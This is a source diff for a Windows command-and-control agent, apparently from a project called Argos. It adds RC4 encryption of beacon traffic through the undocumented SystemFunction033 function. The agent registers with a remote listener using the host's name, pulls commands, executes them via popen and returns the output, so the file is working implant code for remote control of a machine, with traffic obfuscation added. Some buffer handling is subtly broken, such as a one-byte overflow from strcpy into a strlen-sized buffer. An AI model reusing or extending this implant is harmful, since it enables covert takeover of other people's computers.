@@ -3,7 +3,9 @@
 #include <winsock2.h>
 #include <windows.h>
 
-#include "rc4.h"
+#pragma comment (lib, "Advapi32.lib")
+// we include Advapi32 to use the SystemFunction033 undocumented function
+// that performs RC4 encryption for us
 
 
 #ifndef LISTENERS
@@ -23,12 +25,45 @@
 #endif
 
 #ifndef SECRETKEY
-#define SECRETKEY "ArgosSecretKey"
+#define SECRETKEY "ArgosRc4Key"
 #endif
 
 #define LEN_MSG 512
 #define LEN_ID 36
 
+/*
+ * STRUCT AND NTDLL FUNCTION TYPE DEFINITION
+ */
+typedef struct {
+    DWORD Length;
+    DWORD MaximumLength;
+    unsigned char* Buffer;
+} USTRING;
+
+/*
+ * CORE FUNCTIONS
+ */
+BOOL Rc4Encryption(char* data, DWORD dataSize) {
+    USTRING Data = {
+        .Buffer         = data,
+        .Length         = dataSize,
+        .MaximumLength  = dataSize
+    };
+
+    USTRING	Key = {
+        .Buffer         = SECRETKEY,
+        .Length         = strlen(SECRETKEY),
+        .MaximumLength  = strlen(SECRETKEY)
+    };
+
+    NTSTATUS result	= SystemFunction033(&Data, &Key);
+    if (result != 0x0) {
+        printf("[!] SystemFunction033 FAILED With Error: 0x%XX \n", result);
+        return FALSE;
+    }
+
+    return TRUE;
+}
 
 
 SOCKET connectToServer() {
@@ -82,6 +117,7 @@ int pull(char* message) {
         return WSAGetLastError();
     }
 
+    Rc4Encryption(message, readBytes);
     closesocket(serverFd);
     return 0;
 }
@@ -89,32 +125,46 @@ int pull(char* message) {
 
 int sendData(char* message) {
     SOCKET serverFd = connectToServer();
+    int dataSize = strlen(message);
+    char* encData_h = malloc(dataSize);
+
     if (serverFd == SOCKET_ERROR) {
         WSACleanup();
         return WSAGetLastError();
     }
 
-    int byteSent = send(serverFd, message, (int)strlen(message), 0);
-    if (byteSent != (int)strlen(message)) {
+    strcpy(encData_h, message);
+    Rc4Encryption(encData_h, dataSize);
+
+    int byteSent = send(serverFd, encData_h, dataSize, 0);
+    if (byteSent != dataSize) {
         closesocket(serverFd);
         WSACleanup();
         return WSAGetLastError();
     }
 
     closesocket(serverFd);
+    free(encData_h);
+    encData_h = NULL;
     return 0;
 }
 
 
-int sendAndGetResponse(char* send_data, char* response) {
+int sendAndGetResponse(char* sendData, char* response) {
     SOCKET serverFd = connectToServer();
+    int dataSize = strlen(sendData);
+    char* encData_h = malloc(dataSize);
+
+
     if (serverFd == SOCKET_ERROR) {
         WSACleanup();
         return WSAGetLastError();
     }
 
-    int byteSent = send(serverFd, send_data, (int)strlen(send_data), 0);
-    if (byteSent != (int)strlen(send_data)) {
+    strcpy(encData_h, sendData);
+    Rc4Encryption(encData_h, dataSize);
+    int byteSent = send(serverFd, encData_h, dataSize, 0);
+    if (byteSent != dataSize) {
         closesocket(serverFd);
         WSACleanup();
         return WSAGetLastError();
@@ -128,10 +178,14 @@ int sendAndGetResponse(char* send_data, char* response) {
         WSACleanup();
         return WSAGetLastError();
     }
+    Rc4Encryption(response, readBytes);
 
     closesocket(serverFd);
+    free(encData_h);
+    encData_h = NULL;
     return 0;
 }
+
 
 char* execute(char* command) {
     FILE* exec = popen(command, "r");
@@ -174,6 +228,7 @@ char* execute(char* command) {
 
 
 int main() {
+    printf("Secret key is: %s\n", SECRETKEY);
     srand(time(NULL));
     
     char agent_id[LEN_ID + 2] = "f0f0f0f0-f0f0-f0f0-f0f0-f0f0f0f0f0f0:";
@@ -186,12 +241,17 @@ int main() {
     strncpy(intro_h + LEN_ID + 1, hostname_h, strlen(hostname_h));
     intro_h[intro_h_size] = 0x00;
 
-    while (strcmp(agent_id, "f0f0f0f0-f0f0-f0f0-f0f0-f0f0f0f0f0f0:") == 0) {
-        int error = sendAndGetResponse(intro_h, agent_id);
+    char new_id[LEN_ID + 1] = "";
+    while (strcmp(new_id, "") == 0) {
+        int error = sendAndGetResponse(intro_h, new_id);
         if (error != 0) {
             printf("Error while introducing ourselves. (%d) Retrying", error);
+            new_id[0] = 0x00;
+            continue;
         }
     }
+
+    strncpy(agent_id, new_id, LEN_ID);
 
     free(hostname_h);
     hostname_h = NULL;
